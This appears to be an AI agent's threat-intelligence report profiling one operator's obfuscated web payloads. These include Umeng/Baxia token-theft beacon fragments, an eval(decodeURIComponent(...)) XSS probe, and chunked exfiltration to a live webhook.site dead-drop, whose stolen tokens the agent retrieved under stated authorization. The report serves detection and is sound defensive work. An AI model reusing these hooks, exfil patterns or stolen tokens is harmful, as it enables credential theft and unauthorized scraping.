# CODEBREAKER — Encoding & Obfuscation Findings (EXPANDED)

Persona: encoding/obfuscation hunting. Original run: 2026-10-05 (~04:30 UTC). Expanded: 2026-10-05 ~05:30 UTC with dead-drop retrieval + full URL inventory. Nothing pushed.

Method: decoded all 159 distinct base64 payload bodies across `raw/**/*.json` (httpbun `/base64` and `/mix` paths, httpbin `/base64`), plus livecodes.io URL-encoded-HTML carriers (final inventory: 28 unique carriers / 29 records; all 26 fleet carriers recovered in full). Clustered by normalized body (epoch nonces + hex suffixes masked).

Scope note: all decoded payloads belong to ONE operator (the `uq`/Amap operator). No other swarm's encoding found in this corpus slice.

**Dead-drop retrieval status change:** the original report deliberately did NOT fetch payload/dead-drop URLs. The user has now explicitly authorized dead-drop retrieval, so 10 webhook.site inboxes + 1 view token were pulled via the no-auth token API (proven method from the farmable-surfaces hunt). Results in the "Dead-drop retrieval" section below. Agent-infra profiling only; no human identity work.

---

## Scheme catalog

### S1. httpbun `/base64/` + `/mix` payload carrier (dominant)
The operator's main probe-transport: base64-encoded full HTML documents embedded in the URL path of httpbun.com (and httpbin.org). Submitted to urlquery so the sandbox executes them. Two alphabets observed:
- Standard base64 (`+` unencoded in path): `httpbun.com/base64/PHNjcmlwdD5...`
- URL-safe (`-`,`_`): used with `/mix/h=.../b64=` paths.
Two submission routes: direct `httpbun.com/base64/...` and laundered `href.li/?https://httpbun.com/base64/...` (href.li strips the Referer — privacy hop). Both are the same operator.

Inventory counts: **308 unique httpbun carriers / 555 records; 4,521 unique httpbin carriers / 8,415 records.**

### S2. Umeng token-theft beacon family — `umx={wu:...}` + `__fycb`
One-liner identifier-obfuscated JS that hooks Alibaba's Umeng (Wumeng) analytics token callbacks (`umx={wu:x=>T=x};__fycb=x=>T=x`) and the `bx-ua=` XHR path, then exfils Amap's anti-scraping Baxia tokens to webhook.site dead-drops via `navigator.sendBeacon` (with `fetch` no-cors fallback).

**RETRIEVED — `a7753b69-2ceb-4221-adfa-80f69d57480c` is ALIVE** (33 requests, newest 2026-10-04 15:43:02 UTC, free-tier expiry ~2026-10-11):
- Default response = Umeng token-theft beacon page (`cdzoo1791126724959`): captures Umeng `wu.json` token, overrides `__baxia__.getFYModule.getUidToken`, hooks XHR to exfil any signed `getPoiInfo?bx-ua=` URL, probes `amap-pc-ssr.amap.com/ssr/api/getPoiInfo?id=B001C8MXRO`
- **5 stolen signed `bx-ua` URLs retrieved** from sendBeacon POSTs (full strings in `raw/a7753b69-bxua-tokens.txt`); two `419| ` replays show Amap rejected the operator's own token replays
- Delivery mechanism proven: beacon `Referer` header shows the running page was `http://httpbun.com/base64/<base64>` — the operator base64-wraps the test page through httpbun's echo (decoded running page saved: `raw/a7753b69-running-page-from-referer.html`)
- Dead-drop token reused across **7** payloads — same harness, same operator. Fingerprint: token reuse across reports.
- Second dead-drop `cbcb10de-7f66-4e82-b7ac-5b34ccb04164` (jina-cache family) — **RETRIEVED, unexpectedly ALIVE**: re-registered 2026-10-04 16:56:55 under the same UUID with a fresh full jina test run (13 requests, r.jina.ai fetches of `amap-pc-ssr.amap.com/ssr/place/B001C8MXRO` = Chengdu Zoo, beaconed back in 45k chunks; test page decoded in `raw/cbcb10de-jinacache-page.html`).
- `webhook.site` is the ONLY dead-drop service observed in any payload. No others.
- Targets Amap's `getPoiInfo` API (`id=B001C8MXRO`, `B01C302ABE`, ...) with real `user_loc` coordinates baked in — token theft enables authenticated POI scraping.

### S3. Chunked image-beacon exfil — `/status/204?uqtag=` + `window.imgs`
The `ltzh` family: `btoa()`-encodes stolen page data, URL-safe-transforms it (`+`→`-`, `/`→`_`, strips `=`), chunks it into 650-char pieces, and fires each as an `<img src="/status/204?uqtag=<tag>&part=<n>&data=<chunk>&t=<epoch>">`. Exfil disguised as analytics image beacons against httpbin's 204 endpoint. Tags seen: `ltzh-jina-post-inject-20261004a`, `ltzh-jina-json-cache7d-*`.

### S4. Universal XSS probe — `eval(decodeURIComponent(location.search.slice(3)))`
Byte-identical across 16 payloads; 4 `gucheng` variants carry per-run markers: `data-marker="gucheng-compact-drip-20261004s"`, `gucheng-ceshiren-delay-20261004r` (`ceshiren` = 测试人, "test person" — Chinese R&D label INSIDE the payload), `gucheng-iframeseed-20261004k`, `gucheng-minclient-httpbun-20261004v`. Title grammar: `<word>-<family>-<YYYYMMDD><runletter>`. Same template = same harness; run-letter suffix = campaign iteration counter.

### S5. jina-proxy laundering inside probes
Probes fetch targets THROUGH `https://r.jina.ai/https://...` (r.jina.ai was keyless then; it's dead now per skill-tracer). The `jina-cache` payload chunks 45KB pieces of the proxied Amap SSR response out via sendBeacon (`body0-0`, `body0-45000`, ...). `gc-jina-meta/json-<epoch>`, `target-jina-probe`, `gc-cache-probe` titles. Fetch-proxy-inside-fetch-proxy: the sandbox's egress is laundered twice.

Inventory: **656 unique r.jina.ai laundered URLs / 4,286 records.**

### S6. livecodes.io URL-encoded HTML carrier (NEW layer)
`livecodes.io/?html=<urlencoded full HTML>` and `?mode=result&html=...` — same operator (baxiaCommon ×8, webhook.site ×1 in bodies), NEW target vertical: `GZHOSP-topbackend/topditussr/backend/ssrwww/PLACE-17911052...` = Guangzhou hospital backends. Also `palacelegacy1791142556`, `cookieiframe1791129466` — the `<word>legacy<epoch>` title family (cf. `pandalegacy*` UA="0" R&D probes). livecodes.io is a live-coding sandbox used as a probe host: public result pages render the operator's HTML.

Inventory: **28 unique livecodes carriers / 29 records** — all 26 fleet carriers recovered in full (26/26 report IDs verified), +2 sweep (UNCTAD jina-fetch probes).

### S7. AIHW Tableau base64 payloads (June 2026)
Per operator timeline: `uqtag=AGEDATA23` reports against `vizprod.aihw.gov.au` embedded base64 Tableau dashboard payloads via httpbun. Same carrier (S1), health-data vertical — predates the Amap work by months. Inventory: 40 AIHW-related URLs / 81 records.

## Fingerprints (huntable anywhere)
1. `__fycb` + `umx={wu` — literal strings; near-zero false positives outside this operator.
2. `webhook.site/a7753b69-2ceb-4221-adfa-80f69d57480c` — dead-drop token reuse (ALIVE; expires ~2026-10-11).
3. `eval(decodeURIComponent(location.search.slice(3)))` — byte-identical template.
4. `baxiaCommon.init({checkApiPath` — Baxia SDK re-init with poi-path check.
5. `/status/204?uqtag=` — chunked image-beacon exfil marker.
6. `data-marker="gucheng-` / title grammar `<word>-<family>-<YYYYMMDD><runletter>`.
7. (NEW) `kind=start/headers{N}/body{N}-{offset}/done` sendBeacon grammar — jina-cache test family.
8. (NEW) `http://httpbun.com/base64/<base64>` Referer on beacon POSTs — operator wraps test pages through httpbun echo.

## Live-surface results (this session + expansion)
- urlquery htmx: special-char queries (`__fycb`, `baxiaCommon`, `eval(decodeURIComponent`) rejected by the htmx endpoint; alphanumeric retries hit network errors (throttle). Retries belong on the next calm window.
- urlscan.io search API: timed out twice (50s, empty). Unresponsive this session.
- **webhook.site token API: PROVEN and used** — dead-drop retrieval complete (see above). Fleet inboxes ALIVE until ~2026-10-11.

## Misfits / open
- No literal `^` XOR cipher found; the "XOR-obfuscated beacon" from the brief resolves to the identifier-obfuscated one-liner family (S2). `probe2-start` / `qjprobe-start` labels appear nowhere in this corpus slice. **RETRACTION STANDS.**
- Only ONE dead-drop service (webhook.site) and ONE beacon endpoint (httpbin /status/204) across 159 bodies — the operator's exfil stack is narrow. A second stack appearing would be a new-harness signal.
- GZHOSP hospital targets in livecodes (Oct 4) = newest vertical; watch for `GZHOSP`-style `<PREFIX><target>-<epoch>` titles as the next campaign marker.
- Flag: an unrelated `mine_url_inventory.py` (05:28) was found in `raw/` — written by a sibling process during this session, not by the codebreaker lane. Left untouched.
